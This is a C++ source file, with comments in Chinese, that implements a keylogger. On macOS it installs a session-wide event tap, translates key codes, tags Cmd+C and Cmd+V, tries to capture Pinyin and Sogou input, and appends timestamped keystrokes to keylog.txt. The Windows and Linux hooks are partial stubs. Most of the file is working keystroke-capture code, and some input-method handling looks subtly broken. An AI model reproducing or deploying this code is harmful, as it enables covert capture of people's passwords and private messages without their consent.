#include "keylogger.h"
#include <sstream>
#include <map>
#include <set>

// 键码到字符的映射
static std::map<CGKeyCode, char> keyCodeMap;

void initKeyCodeMap() {
    keyCodeMap[0x00] = 'a'; keyCodeMap[0x01] = 's'; keyCodeMap[0x02] = 'd'; keyCodeMap[0x03] = 'f'; keyCodeMap[0x04] = 'h';
    keyCodeMap[0x05] = 'g'; keyCodeMap[0x06] = 'z'; keyCodeMap[0x07] = 'x'; keyCodeMap[0x08] = 'c'; keyCodeMap[0x09] = 'v';
    keyCodeMap[0x0B] = 'b'; keyCodeMap[0x0C] = 'q'; keyCodeMap[0x0D] = 'w'; keyCodeMap[0x0E] = 'e'; keyCodeMap[0x0F] = 'r';
    keyCodeMap[0x10] = 'y'; keyCodeMap[0x11] = 't'; keyCodeMap[0x12] = '1'; keyCodeMap[0x13] = '2'; keyCodeMap[0x14] = '3';
    keyCodeMap[0x15] = '4'; keyCodeMap[0x16] = '6'; keyCodeMap[0x17] = '5'; keyCodeMap[0x18] = '='; keyCodeMap[0x19] = '9';
    keyCodeMap[0x1A] = '7'; keyCodeMap[0x1B] = '-'; keyCodeMap[0x1C] = '8'; keyCodeMap[0x1D] = '0'; keyCodeMap[0x1E] = ']';
    keyCodeMap[0x1F] = 'o'; keyCodeMap[0x20] = 'u'; keyCodeMap[0x21] = '['; keyCodeMap[0x22] = 'i'; keyCodeMap[0x23] = 'p';
    keyCodeMap[0x24] = '\n'; keyCodeMap[0x25] = 'l'; keyCodeMap[0x26] = 'j'; keyCodeMap[0x27] = '\''; keyCodeMap[0x28] = 'k';
    keyCodeMap[0x29] = ';'; keyCodeMap[0x2A] = '\\'; keyCodeMap[0x2B] = ','; keyCodeMap[0x2C] = '/'; keyCodeMap[0x2D] = 'n';
    keyCodeMap[0x2E] = 'm'; keyCodeMap[0x2F] = '.'; keyCodeMap[0x32] = '`'; keyCodeMap[0x31] = ' ';
}

// 判断文本是否可能是句子结尾
bool isSentenceEnd(const std::string& text) {
    if (text.empty()) return false;
    
    // 检查英文句子结尾
    char lastChar = text.back();
    std::string endChars = "。！？；：.!?";
    return endChars.find(lastChar) != std::string::npos;
}

// 判断文本是否可能是句子开头（首字母大写）
bool isSentenceStart(const std::string& text) {
    if (text.empty()) return false;
    return std::isupper(text[0]);
}

KeyLogger::KeyLogger() {
    logFile.open("keylog.txt", std::ios::app | std::ios::out);
    if (logFile.is_open()) {
        // 写入 UTF-8 BOM
        unsigned char bom[] = {0xEF, 0xBB, 0xBF};
        logFile.write((char*)bom, sizeof(bom));
        // 写入初始时间戳
        logFile << getCurrentTimestamp() << " - ";
    }
    isRunning = false;
    buffer = "";
    initKeyCodeMap();
}

KeyLogger::~KeyLogger() {
    if (logFile.is_open()) {
        logFile.close();
    }
}

std::string KeyLogger::getCurrentTimestamp() {
    auto now = std::chrono::system_clock::now();
    auto time = std::chrono::system_clock::to_time_t(now);
    std::string timestamp = std::ctime(&time);
    timestamp.pop_back(); // 移除换行符
    return timestamp;
}

void KeyLogger::logKey(char key) {
    if (!logFile.is_open()) return;
    
    if (key == ' ') {
        // 检查当前缓冲区是否以句子结尾
        bool isEnd = isSentenceEnd(buffer);
        // 写入空格
        logFile << " ";
        buffer += " ";
        
        // 如果是句子结尾，添加时间戳
        if (isEnd) {
            logFile << std::endl << getCurrentTimestamp() << " - ";
            buffer = "";
        }
    } else {
        logFile << key;
        buffer += key;
    }
    logFile.flush();
}

void KeyLogger::logUnicode(const std::string& text) {
    if (!logFile.is_open()) return;
    
    std::string remaining = text;
    size_t pos = 0;
    
    while ((pos = remaining.find(' ')) != std::string::npos) {
        // 获取空格前的文本
        std::string beforeSpace = remaining.substr(0, pos);
        buffer += beforeSpace;
        
        // 检查是否是句子结尾
        bool isEnd = isSentenceEnd(buffer);
        
        // 写入文本和空格
        logFile << beforeSpace << " ";
        buffer += " ";
        
        // 获取空格后的文本
        remaining = remaining.substr(pos + 1);
        
        // 如果前面是句子结尾，并且后面的文本可能是新句子的开头
        if (isEnd && !remaining.empty() && isSentenceStart(remaining)) {
            logFile << std::endl << getCurrentTimestamp() << " - ";
            buffer = "";
        }
    }
    
    // 写入剩余的文本
    if (!remaining.empty()) {
        logFile << remaining;
        buffer += remaining;
    }
    
    logFile.flush();
}

#ifdef _WIN32
#include <windows.h>

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // 记录按键
            // 可以在此处调用记录函数
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void startWindowsKeylogger() {
    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) != 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hhkLowLevelKybd);
}
#endif

#ifdef __APPLE__
#include <CoreText/CoreText.h>

static CGEventRef inputMethodCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    KeyLogger* logger = (KeyLogger*)refcon;
    
    if (type == kCGEventKeyDown) {
        CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        CGEventFlags flags = CGEventGetFlags(event);
        
        // 检查组合键
        if ((flags & kCGEventFlagMaskCommand) != 0) {  // 检测 Cmd 键
            if (keyCode == 0x08) {  // 'C' 键
                logger->logUnicode("[Cmd+C]");
            } else if (keyCode == 0x09) {  // 'V' 键
                logger->logUnicode("[Cmd+V]");
            }
        } else {
            // 检查是否是输入法的确认键（空格、数字键1-9、回车）
            if (keyCode == 0x31 || (keyCode >= 0x12 && keyCode <= 0x1B) || keyCode == 0x24) {
                // 获取输入法的最终输出
                TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
                if (currentKeyboard) {
                    CFStringRef inputSourceID = (CFStringRef)TISGetInputSourceProperty(currentKeyboard, kTISPropertyInputSourceID);
                    if (inputSourceID) {
                        char buffer[256];
                        if (CFStringGetCString(inputSourceID, buffer, sizeof(buffer), kCFStringEncodingUTF8)) {
                            std::string inputSource(buffer);
                            if (inputSource.find("Pinyin") != std::string::npos || inputSource.find("Sogou") != std::string::npos) {
                                // 处理拼音或搜狗输入法的输出
                                CFStringRef composedText = (CFStringRef)TISGetInputSourceProperty(currentKeyboard, kTISPropertyInputModeID);
                                if (composedText) {
                                    char composedBuffer[256];
                                    if (CFStringGetCString(composedText, composedBuffer, sizeof(composedBuffer), kCFStringEncodingUTF8)) {
                                        logger->logUnicode(composedBuffer);
                                    }
                                }
                            }
                        }
                    }
                    CFRelease(currentKeyboard);
                }
            } else {
                // 普通按键处理
                if (keyCodeMap.find(keyCode) != keyCodeMap.end()) {
                    logger->logKey(keyCodeMap[keyCode]);
                }
            }
        }
    }
    
    return event;
}

void KeyLogger::start() {
    isRunning = true;
    
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        kCGEventTapOptionDefault,
        eventMask,
        inputMethodCallback,
        this
    );
    
    if (!eventTap) {
        std::cout << "Failed to create event tap. Try running with root privileges." << std::endl;
        return;
    }
    
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(
        kCFAllocatorDefault,
        eventTap,
        0
    );
    
    CFRunLoopAddSource(
        CFRunLoopGetCurrent(),
        runLoopSource,
        kCFRunLoopCommonModes
    );
    
    CGEventTapEnable(eventTap, true);
    CFRunLoopRun();
}

void KeyLogger::stop() {
    isRunning = false;
}
#endif

#ifdef __linux__
#include <X11/Xlib.h>
#include <X11/extensions/record.h>
#include <X11/extensions/XTest.h>

void recordCallback(XPointer priv, XRecordInterceptData *hook) {
    if (hook->category == XRecordFromServer) {
        // 处理键盘事件
        // 可以在此处调用记录函数
    }
    XRecordFreeData(hook);
}

void startLinuxKeylogger() {
    Display *display = XOpenDisplay(NULL);
    if (!display) return;

    XRecordContext rc;
    XRecordRange *rr = XRecordAllocRange();
    rr->device_events.first = KeyPress;
    rr->device_events.last = KeyRelease;

    rc = XRecordCreateContext(display, 0, &rr, 1);
    if (!rc) return;

    XRecordEnableContext(display, rc, recordCallback, NULL);
    XRecordFreeContext(display, rc);
    XCloseDisplay(display);
}
#endif
